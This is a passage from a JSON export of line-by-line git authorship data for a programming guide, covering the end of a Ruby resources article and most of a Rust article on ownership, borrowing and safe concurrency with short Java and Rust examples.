          "gitId": "-"
        },
        "content": "More on this in [Object-oriented Ruby tutorial](https://www.tutorialspoint.com/ruby/ruby_object_oriented.htm)."
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": "## Advanced Topics"
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": "- [Blocks in Ruby](https://www.tutorialspoint.com/ruby/ruby_blocks.htm) - ever imagine that a method invocation can be another method\u0027s parameter?"
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": "- [Modules and mixins in Ruby](https://www.tutorialspoint.com/ruby/ruby_modules.htm) - provides namespacing, and makes multiple inheritance (or a variant of it, technically) possible."
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": "- [Threads and fibers in Ruby](http://pltconfusion.com/concurrency_primitives_and_abstractions_in_ruby/) - dealing with concurrencies."
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": "- [Metaprogramming in Ruby](https://www.toptal.com/ruby/ruby-metaprogramming-cooler-than-it-sounds) - when your Ruby code *writes* Ruby code at runtime."
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": "- [Domain-Specific Languages (DSLs) in Ruby](https://www.leighhalliday.com/creating-ruby-dsl) - Ruby\u0027s amazing support for blocks and metaprogramming makes it a first choice for many developers to write a DSL."
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": "- [Ruby style guide](https://github.com/bbatsov/ruby-style-guide) - as agreed by the community at large."
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": "- [21 Ruby tricks](http://www.rubyinside.com/21-ruby-tricks-902.html) - making good use of Ruby\u0027s language features."
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": "- [Ruby best practices](http://www.reedbushey.com/119Ruby%20Best%20Practices.pdf) - a book written by a Ruby expert with foreword provided by Yukihiro Matsumoto himself."
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": "## Ruby Frameworks and DevOps"
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": "As with most other languages, tools and frameworks exist for serious Ruby developers and project managers to assist many of their tasks."
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- **Frameworks:** [Ruby on Rails](https://rubyonrails.org) is by far the most popular web application framework for Ruby. Another popular framework is [Sinatra](http://www.sinatrarb.com)."
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": "- **Libraries:** Ruby libraries come in form of *gems*. The complete registry can be found on [this website](https://rubygems.org)."
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": "- **IDE:** [Aptana Studio](http://www.aptana.com/products/studio3.html) is the favourite IDE for Rails developers. Other alternatives are [RubyMine](https://www.jetbrains.com/ruby/) (commercial) and Eclipse with [RDT plugin](https://sourceforge.net/projects/rubyeclipse/)."
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": "- **Task Automation:** [Rake](http://docs.seattlerb.org/rake/) is the most commonly used automation tool."
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- **Static Analysis:** [RuboCop](https://batsov.com/rubocop/) is the sole leading static analysis tool for Ruby language."
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": "[This repository](https://github.com/markets/awesome-ruby) lists down a large collection of Ruby libraries, tools, frameworks, and software."
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 4,
      "jamessspanggg": 4,
      "iskandarzulkarnaien": 12,
      "-": 154
    }
  },
  {
    "path": "contents/rust/Rust.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Rust"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Rust"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Author(s): [Tan Li Hao](https://github.com/LiHaoTan)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Why Rust‎](#why-rust)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Safety‎](#safety)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Better support for concurrency‎](#better-support-for-concurrency)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Practicality‎](#practicality)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [How to learn Rust‎](#how-to-learn-rust)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "    * [Resources to learn Rust‎](#resources-to-learn-rust)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Why not Rust‎](#why-not-rust)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": "## Why Rust"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": "Rust is a multi-paradigm (e.g. functional and imperative) systems language, but as it is relatively new the benefits of learning or using the language is not very clear. In any case, it is important to know the merits of a language so we know when to use them."
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "The main merits would be in its [design](https://www.rust-lang.org/en-US/faq.html#what-is-this-projects-goal):"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "* [Safety](#safety) (e.g. memory safe)"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "* [Better support for concurrency](#better-support-for-concurrency)"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "* [Practicality](#practicality)"
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "### Safety"
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "Designing the language to be safe allows common safety errors such as segmentation faults ([[1]](https://en.wikipedia.org/wiki/Segmentation_fault), [[2]](https://stackoverflow.com/questions/2346806/what-is-a-segmentation-fault/2346849#2346849)), [resource leaks](https://blog.skylight.io/rust-means-never-having-to-close-a-socket/), and [many others](https://www.reddit.com/r/rust/comments/2mwpie/what_are_the_advantages_of_rust_over_modern_c/) to be avoided. Many of these pitfalls can already be avoided in modern languages such as [RAII](https://en.wikipedia.org/wiki/Resource_acquisition_is_initialization) in C++ and [try-with-resources](https://blogs.oracle.com/darcy/more-concise-try-with-resources-statements-in-jdk-9) in Java, but mostly still requires developer discipline to ensure safety ([[1]](https://www.rust-lang.org/en-US/faq.html#why-rust-vs-cxx), [[2]](https://www.reddit.com/r/rust/comments/2mwpie/what_are_the_advantages_of_rust_over_modern_c/))."
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "The underlying concept for the safety provided in Rust is called [ownership](https://doc.rust-lang.org/book/second-edition/ch04-00-understanding-ownership.html). Intuitively, the concept just means that each value only has a single owner (i.e. a variable) and if the value needs to be shared, it can be borrowed. This is a powerful concept that ensures safety in Rust compile-time and [can be applied to other languages](https://codewithoutrules.com/2017/01/26/object-ownership/)."
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "Take a simplified example in Java of a class called `VisibleIndexes` maintaining the list of visible indexes of UI elements:"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "```Java"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "class VisibleIndexes {"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "    private List\u003cInteger\u003e indexes;"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "    public VisibleIndexes() {"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "        indexes \u003d new ArrayList\u003c\u003e();"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "    public void addIndex(int index) {"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "        indexes.add(index);"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "    public List\u003cInteger\u003e getVisibleIndexes() {"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "        return Collections.unmodifiableList(indexes);"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "        "
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "        // Should not do this because indexes can then be modified outside class"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "        //return indexes; "
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "One would need the discipline to make sure to return only a view of the list, otherwise the following would be legal, but unexpected:"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "```Java"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "VisibleIndexes visibleIndexes \u003d new VisibleIndexes();"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "visibleIndexes.addIndex(1);"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "List\u003cInteger\u003e indexes\u003d visibleIndexes.getVisibleIndexes();"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "System.out.println(indexes); // Output: [1]"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "listCounts.add(9999); // Unexpected mutation of the internal list in VisibleIndexes"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "System.out.println(visibleIndexes.getVisibleIndexes()); // Output: [1, 9999]"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "In Rust, we can implement it like this:"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "```Rust"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "struct VisibleIndexes {"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "    indexes: Vec\u003ci32\u003e"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "impl VisibleIndexes {"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "    pub fn new() -\u003e VisibleIndexes {"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "        VisibleIndexes {"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "            indexes: Vec::new(),"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "        }"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "    pub fn add_index(\u0026mut self, value: i32) {"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "        self.indexes.push(value);"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "    pub fn get_visible_indexes(\u0026mut self) -\u003e \u0026mut Vec\u003ci32\u003e {"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "        \u0026mut self.indexes"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "In particular, we should pay attention to `\u0026mut Vec\u003ci32\u003e` which means to return a mutable reference to a Vector (List in Java)."
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "Due to Rust\u0027s defaults, variables are by default immutable, and `self.indexes` can only have a single owner which will be the instance of `VisibleIndexes` instantiated."
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "One way to allow for mutation outside the instance would be to borrow the value (by using a reference) and it would have to be a mutable one for us to be able to modify the internal list `indexes` outside an instance of `VisibleIndexes`."
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "So we have to go through some hoops just to be able to modify the internal list but it doesn\u0027t end here. Suppose the following is then executed:"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "```Rust"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "let mut visible_indexes \u003d VisibleIndexes::new();"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "visible_indexes.add_index(1);"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "let indexes \u003d visible_indexes.get_visible_indexes();"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "println!(\"{:?}\", indexes); // Output: [1]"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "indexes.push(9999);"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "println!(\"{:?}\", visible_indexes.get_visible_indexes()); // Cannot compile!"
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "Everything would have executed like in Java except it does not compile because of the last line in Rust. This is shown in the error message below: "
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "```shell"
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": "let indexes \u003d visible_indexes.get_visible_indexes()"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "              --------------- first mutable borrow occurs here"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "..."
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "println!(\"{:?}\", visible_indexes.get_visible_indexes()); // Cannot compile!"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "                 ^^^^^^^^^^^^^^^ second mutable borrow occurs here"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "In any single scope, there can only be one mutable borrow. However, the scope of the value borrowed by `indexes` does not end until the end of a block (i.e. a closing brace). Attempting to borrow the same value again in the same scope which will not compile in Rust."
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Better Support for Concurrency"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "Concurrency is getting [increasingly important](https://softwareengineering.stackexchange.com/questions/115474/why-should-i-know-concurrent-programming) but it is challenging to write concurrent code ([[1]](https://news.ycombinator.com/item?id\u003d8138578), [[2]](https://golang.org/doc/faq#csp), [[3]](http://joeduffyblog.com/2016/11/30/15-years-of-concurrency/))."
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "Rust provides concurrency which is built upon the safety concepts. The implication is that the safety concepts allows us to be [fearless when writing concurrent code](https://blog.rust-lang.org/2015/04/10/Fearless-Concurrency.html) by helping point out mistakes compile time. "
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "Take an [example](https://doc.rust-lang.org/book/second-edition/ch16-02-message-passing.html) of the increasingly popular approach to concurrency called message passing:"
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": "```Rust"
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": "fn main() {"
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "    let (tx, rx) \u003d mpsc::channel();"
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "    thread::spawn(move || {"
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "        let val \u003d String::from(\"hi\");"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": "        tx.send(val).unwrap();"
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": "        println!(\"val is {}\", val); // this line does not compile!"
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": "    });"
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": "    let received \u003d rx.recv().unwrap();"
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "    println!(\"Got: {}\", received);"
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": "In the example, the message `\"hi\"` from the new thread is passed to the main thread. However, it does not compile and produce the following error message:"
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": "```Shell"
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": "tx.send(val).unwrap();"
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": "        --- value moved here"
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": "println!(\"val is {}\", val);"
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": "                      ^^^ value used here after move"
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": "When sending a message in Rust, the ownership is transferred (moved). Hence, using the value after the ownership is transferred would not compile. This is important because the string `\"hi\"` can be mutated by the receiving thread before `println!` executes, yielding unexpected behavior."
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": "### Practicality"
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": "Rust is designed to be practical, as shown in Rust\u0027s guiding design:"
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": "* Uses old established techniques instead of particularly cutting-edge technologies"
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": "* Provides only majority-case features"
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": "* Runs on widely used platforms without unnecessary compromises"
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": "See [non-goals](https://www.rust-lang.org/en-US/faq.html#what-are-some-non-goals)."
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": "#### Production Ready"
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": "Also, in order for a language to be practical it must be usable in production. A well known large project that uses Rust is [Servo](https://github.com/servo/servo), the prototype browser engine Mozilla is working on. On top of that, there are many other [organizations running Rust in production](https://www.rust-lang.org/en-US/friends.html). As an example, Jamie Turner from Dropbox [explains the reasons for using Rust](https://news.ycombinator.com/item?id\u003d11283688)."
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### Developer Experience"
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": "Practicality can also be measured with how much developers enjoy using the language and want to continue using it, because if the language is not very practical the developer experience would not be very good. For Rust, it is a language that developers want to continue using ([[1]](https://www.reddit.com/r/rust/comments/842adc/rust_voted_most_loved_language_for_the_3rd_year/dvmftnk/), [[2]](https://medium.com/mozilla-tech/why-rust-is-the-most-loved-language-by-developers-666add782563))."
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": "Although Rust does not use particularly cutting-edge technologies, Rust is still modern in that it is [significantly influenced by functional programming](https://doc.rust-lang.org/book/second-edition/ch13-00-functional-features.html), and has a type system that is [drawn from Haskell\u0027s typeclasses](https://www.rust-lang.org/en-US/faq.html#compare-go-and-rust). This allows Rust to also benefit from the advantages of functional programming. "
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": "There are also a lot of other details that go into making a great developer experience, such as tooling and documentation. However, instead of going into more details, let\u0027s look at a resource that summarizes why others think Rust is great:"
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "-"
        },
        "content": "[fireflowers - The Rust Programming Language, in the words of its practitioners](https://brson.github.io/fireflowers/)"
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## How to Learn Rust"
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "-"
        },
        "content": "Knowing the merits of a language without knowing how to learn it however is not sufficient. As [mentioned](#developer-experience), part of making the developer experience great is good documentation. And there are many great avenues to learn Rust."
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "-"
        },
        "content": "One issue is that many have said Rust is difficult but we should not be so concerned because there has since been many [improvements](https://blog.rust-lang.org/2017/12/21/rust-in-2017.html#rust-should-have-a-lower-learning-curve) to reduce the learning curve."
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Resources to Learn Rust"
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "-"
        },
        "content": "There are already great official resources to learn Rust, for instance:"
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "-"
        },
        "content": "- [The Rust Programming Language book](https://doc.rust-lang.org/book/)"
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "-"
        },
        "content": "- [Rust By Example](https://rustbyexample.com/)"
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "-"
        },
        "content": "- [Frequently Asked Questions](https://www.rust-lang.org/en-US/faq.html)"
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "-"
        },
        "content": "There is also a [large collection of community-maintained resources](https://github.com/ctjhoa/rust-learning), and the following are some resources that are possibly useful:"
      },
      {
